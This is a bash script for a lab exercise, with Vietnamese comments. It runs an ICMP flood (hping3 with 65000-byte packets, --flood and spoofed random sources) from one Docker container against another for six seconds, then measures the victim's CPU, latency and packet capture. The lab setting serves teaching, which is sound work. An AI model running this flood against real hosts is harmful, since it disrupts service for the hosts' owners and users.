#!/bin/bash
# Kich ban 1 (Lab 04): Tan cong ICMP Flood (Ping of Death / Large ICMP Flood)
# Lenh PDF: sudo hping3 --icmp <IP_Victim> -d 65000 --flood --rand-source

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_LAB="$(cd "${SCRIPT_DIR}/.." && pwd)"

CONTAINER_VICTIM="lab04_victim"
CONTAINER_ATTACKER="lab04_attacker"
CONTAINER_USER="lab04_user"
IP_VICTIM="10.2.6.20"

PCAP_PATH="/tmp/lab04_sc1.pcap"
fail=0

note() { printf '\n===== %s =====\n' "$1"; }
pass() { echo "PASS: $1"; }
bad() { echo "FAIL: $1"; fail=1; }

note "[Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim"
echo "--- CPU / RAM (top snapshot truoc tan cong) ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12

note "[Buoc 3] Bat tcpdump bat goi tin ICMP tren Victim"
sudo docker exec "$CONTAINER_VICTIM" rm -f "$PCAP_PATH"
sudo docker exec -d "$CONTAINER_VICTIM" tcpdump -i eth0 -n -w "$PCAP_PATH" icmp

note "[Buoc 4] Attacker phat dong tan cong ICMP Flood (-d 65000 --flood --rand-source) trong 6 giay"
echo "Lenh thuc thi: hping3 --icmp $IP_VICTIM -d 65000 --flood --rand-source"
if sudo docker exec "$CONTAINER_ATTACKER" which hping3 >/dev/null 2>&1; then
  sudo docker exec "$CONTAINER_ATTACKER" timeout 6 hping3 --icmp "$IP_VICTIM" -d 65000 --flood --rand-source 2>/dev/null || true
else
  sudo timeout 6 hping3 --icmp "$IP_VICTIM" -d 65000 --flood --rand-source 2>/dev/null || true
fi

note "[Buoc 5] User thu nghiem ket noi toi Victim trong luc tan cong"
echo "--- Kiem tra do tre ping tu User toi Victim ---"
sudo docker exec "$CONTAINER_USER" ping -c 3 -W 1 "$IP_VICTIM" || echo "Ping bi rot goi tin hoac timeout cao!"
echo "--- Kiem tra ket noi Telnet port 23 tu User toi Victim ---"
sudo docker exec "$CONTAINER_USER" nc -z -w 2 "$IP_VICTIM" 23 && echo "Ket noi duoc nhung phan hoi rat cham" || echo "Ket noi Telnet that bai / Timeout"

note "[Buoc 6] Quan sat thong so TRONG KHI bi tan cong tren Victim"
echo "--- CPU / RAM (top snapshot trong khi tan cong) ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12

note "[Buoc 7, 8, 9] Dung tan cong, ket thuc bat goi va phan tich ket qua"
sudo docker exec "$CONTAINER_VICTIM" pkill -9 tcpdump 2>/dev/null || true
sleep 1

echo "--- Thong ke goi tin trong pcap tren Victim ---"
sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" -c 10 2>/dev/null || true
packet_count=$(sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" 2>/dev/null | wc -l)
echo "[+] Tong so goi tin ICMP bat duoc: $packet_count goi tin"
if [[ "$packet_count" -gt 0 ]]; then
  pass "Thu thap thanh cong luu luong ICMP Flood ($packet_count goi)"
else
  bad "Khong bat duoc luu luong ICMP"
fi

echo
if [[ "$fail" -eq 0 ]]; then
  echo "KET QUA KICH BAN 1 (ICMP FLOOD): PASS"
else
  echo "KET QUA KICH BAN 1 (ICMP FLOOD): FAIL"
fi
exit "$fail"
